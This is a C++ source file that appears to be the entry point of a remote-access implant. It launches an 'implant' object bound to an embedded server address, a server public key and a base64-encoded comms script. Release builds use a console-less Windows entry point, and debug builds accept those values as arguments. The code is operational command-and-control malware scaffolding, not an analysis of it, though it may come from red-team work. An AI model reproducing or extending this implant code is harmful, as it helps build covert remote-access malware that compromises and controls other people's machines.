#include "implant.h"
#include "patch.h"

#ifdef NDEBUG

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow) {
#else
int main(int argc, char *argv[]) {
#endif
  implant i(server, server_public_key, util::base64::decode(script));
  i.run();
}
#else

#include <util/filesystem.hpp>

int main(int argc, char *argv[]) {

  if (argc > 1) {
    if (argc != 4) {
      fprintf(stderr, "Usage: %s <server> <server_public_key_base64> </path/to/comms/package.zip>\n", std::filesystem::path(argv[0]).filename().string().c_str());
      exit(1);
    }
    auto server_s = std::string(argv[1]);
    auto server_public_key_s = std::string(argv[2]);
    auto script_path = std::string(argv[3]);
    auto script_s = util::filesystem::read_file(script_path);

    printf("Press any key to start implant...");
    getchar();

    implant i(server_s, server_public_key_s, script_s);
    i.run();
  }
  else {
    implant i(server, server_public_key, util::base64::decode(script));
    i.run();
  }
}
#endif
